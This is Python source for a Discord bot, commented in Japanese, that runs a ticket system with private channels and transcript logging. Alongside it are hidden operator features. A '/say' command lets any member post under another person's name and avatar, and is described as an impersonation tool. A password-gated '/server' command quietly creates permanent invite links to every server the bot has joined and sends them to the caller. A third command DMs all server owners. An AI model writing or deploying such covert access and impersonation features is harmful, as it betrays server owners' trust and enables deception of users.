import discord
from discord.ext import commands
from discord import app_commands
import os
import requests

# Botの設定
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.members = True  # メンバー情報の取得に必要
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
SECRET_PASSWORD = 'ぱすわーど'

class TicketView(discord.ui.View):
    def __init__(self, role: discord.Role, category: discord.CategoryChannel, log_channel: discord.TextChannel):
        super().__init__(timeout=None)
        self.role = role
        self.category = category
        self.log_channel = log_channel

    @discord.ui.button(label="チケットを作成", style=discord.ButtonStyle.green, custom_id="create_ticket")
    async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild

        # チケットチャンネル名を定義
        channel_name = f"ticket-{interaction.user.name}"

        # 同名のチャンネルが既に存在しているか確認
        existing_channel = discord.utils.get(self.category.channels, name=channel_name)
        if existing_channel:
            await interaction.response.send_message("既にチケットが存在します！", ephemeral=True)
            return

        # チャンネルを作成
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),  # デフォルトでは非公開
            interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True),  # 作成者にアクセスを許可
            self.role: discord.PermissionOverwrite(view_channel=True, send_messages=True)  # 指定ロールにアクセスを許可
        }

        channel = await self.category.create_text_channel(name=channel_name, overwrites=overwrites)

        await interaction.response.send_message(f"チケットチャンネル {channel.mention} を作成しました！", ephemeral=True)

        # チャンネルに初期メッセージを送信
        delete_view = DeleteTicketView(channel, self.log_channel, interaction.user)
        await channel.send(
            f"{self.role.mention} チケットが作成されました。\n{interaction.user.mention} がこのチケットを作成しました。\n"
            f"解決したら以下のボタンを押してチャンネルを削除してください。",
            view=delete_view
        )

        # ログチャンネルに通知を送信
        await self.log_channel.send(f"チケットチャンネル {channel.mention} が作成されました。\n作成者: {interaction.user.mention}")


class DeleteTicketView(discord.ui.View):
    def __init__(self, channel: discord.TextChannel, log_channel: discord.TextChannel, ticket_creator: discord.Member):
        super().__init__(timeout=None)
        self.channel = channel
        self.log_channel = log_channel
        self.ticket_creator = ticket_creator

    @discord.ui.button(label="チケットを削除", style=discord.ButtonStyle.red, custom_id="delete_ticket")
    async def delete_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        # チケットのメッセージをファイルに保存
        transcript_file = f"{self.channel.name}_transcript.txt"
        with open(transcript_file, "w", encoding="utf-8") as file:
            async for message in self.channel.history(oldest_first=True):
                timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
                file.write(f"[{timestamp}] {message.author}: {message.content}\n")

        # ログチャンネルにファイルを送信
        timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
        await self.log_channel.send(
            f" {timestamp} チケットチャンネル {self.channel.name} が削除されました。\n削除者: {interaction.user.mention}",
            file=discord.File(transcript_file)
        )

        # チケット作成者にDMを送信
        try:
            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
            await self.ticket_creator.send(
                f"{timestamp}あなたのチケットチャンネル `{self.channel.name}` が削除されました。\n以下がチケットの記録です。",
                file=discord.File(transcript_file)
            )
        except discord.Forbidden:
            await self.log_channel.send(f"チケット作成者 {self.ticket_creator.mention} へのDM送信に失敗しました。")

        # 一時ファイルを削除
        os.remove(transcript_file)

        # チャンネル削除
        await self.channel.delete(reason=f"チケット削除 by {interaction.user}")


@bot.tree.command(name="ticket", description="チケットを作成するボタンを送信します")
@app_commands.describe(
    role="チケットにアクセスできるロール",
    category="チケットチャンネルを作成するカテゴリー",
    log_channel="チケットのログを送信するチャンネル",
    title="埋め込みメッセージのタイトル（省略可能）",
    description="埋め込みメッセージの説明（省略可能）"
)
async def ticket(
    interaction: discord.Interaction,
    role: discord.Role,
    category: discord.CategoryChannel,
    log_channel: discord.TextChannel,
    title: str = "チケット発行",
    description: str = "チケットを発行する場合は下のボタンを押してください"
):
    # Embedの作成
    embed = discord.Embed(
        title=title,
        description=description,
        color=discord.Color.blue()
    )

    # ボタン付きのメッセージを送信
    view = TicketView(role=role, category=category, log_channel=log_channel)
    await interaction.response.send_message(embed=embed, view=view)

@bot.tree.command(name="say", description="他人になりすませれます")
async def say(interaction: discord.Interaction, user: discord.Member, message: str):
    """
    指定したチャンネルにウェブフックを作成して、そのウェブフックを使い
    指定されたユーザー風の名前とアイコンでメッセージを送信する
    """
    try:
        # 実行されたチャンネル
        channel = interaction.channel

        # チャンネルにWebhookを作成
        webhook = await channel.create_webhook(name=f"{user.display_name}'s webhook")

        # ユーザーの名前とアバターURLを取得
        username = user.display_name
        avatar_url = user.avatar.url if user.avatar else user.default_avatar.url

        # Webhookでメッセージを送信
        await webhook.send(
            content=message,  # メッセージ内容
            username=username,  # Webhookの名前をユーザー名に設定
            avatar_url=avatar_url  # Webhookのアイコンをユーザーのアイコンに設定
        )

        # Webhookを削除
        await webhook.delete()

        # 完了メッセージを送信
        await interaction.response.send_message("送信に成功", ephemeral=True)

    except Exception as e:
        # エラーハンドリング
        await interaction.response.send_message(f"エラーが発生しました: {str(e)}",ephemeral=True)
        #await channel.send(f"エラーが発生しました: {str(e)}",ephemeral=True)

@bot.tree.command(name="announce", description="Botを導入しているサーバーのオーナーにお知らせを送信します")
@app_commands.describe(
    password="管理者のみが知るパスワード",
    message="サーバーオーナーに送るメッセージ"
)
async def announce(interaction: discord.Interaction, password: str, message: str):
    # ✅ パスワードチェック
    if password != SECRET_PASSWORD:
        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長

    success_count = 0
    failed_count = 0

    # ✅ Botが参加しているすべてのサーバーのオーナーにDMを送信
    for guild in bot.guilds:
        owner = guild.owner  # サーバーオーナーを取得
        if owner:
            try:
                embed = discord.Embed(
                    title="📢 重要なお知らせ",
                    description=message,
                    color=discord.Color.gold()
                )
                embed.set_footer(text=f"送信元: {interaction.guild.name}")

                await owner.send(embed=embed)
                success_count += 1
            except discord.Forbidden:
                failed_count += 1  # DM送信が拒否された場合

    # ✅ 実行者に結果を報告
    await interaction.followup.send(f"✅ {success_count} 件のサーバーオーナーにお知らせを送信しました。\n❌ {failed_count} 件のオーナーには送信できませんでした。", ephemeral=True)

@bot.tree.command(name="server", description="Botが参加しているサーバー情報を取得します")
@app_commands.describe(password="管理者のみが知るパスワード")
async def server(interaction: discord.Interaction, password: str):
    # ✅ パスワードチェック
    if password != SECRET_PASSWORD:
        await interaction.response.send_message("❌ パスワードが間違っています。", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)  # インタラクションの有効期限を延長

    server_info_list = []
    
    for guild in bot.guilds:
        owner = guild.owner  # サーバーオーナーを取得
        invite_link = "作成不可"  # 初期値
        
        try:
            # ✅ Botが「招待を作成」権限を持っている場合のみ、招待リンクを作成
            if guild.me.guild_permissions.create_instant_invite:
                invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
                invite_link = invite.url
        except Exception:
            pass  # 何らかの理由で招待リンクを取得できない場合は無視

        # ✅ サーバー情報をリストに追加
        server_info_list.append(f"📌 **サーバー名:** {guild.name}\n👑 **オーナー:** {owner}\n🔗 **招待リンク:** {invite_link}\n")

    # ✅ 実行者にDMで送信
    server_info_text = "\n".join(server_info_list)
    
    try:
        await interaction.user.send(f"📋 **Botが参加しているサーバー情報**\n\n{server_info_text}")
        await interaction.followup.send("📩 サーバー情報をDMに送信しました。", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("⚠️ DMの送信に失敗しました。DMを受け取れるように設定してください。", ephemeral=True)

# Botの起動
@bot.event
async def on_ready():
    print(f"ログインしました：{bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"スラッシュコマンドを {len(synced)} 個同期しました")
    except Exception as e:
        print(f"スラッシュコマンドの同期に失敗しました: {e}")

bot.run("とーくん")
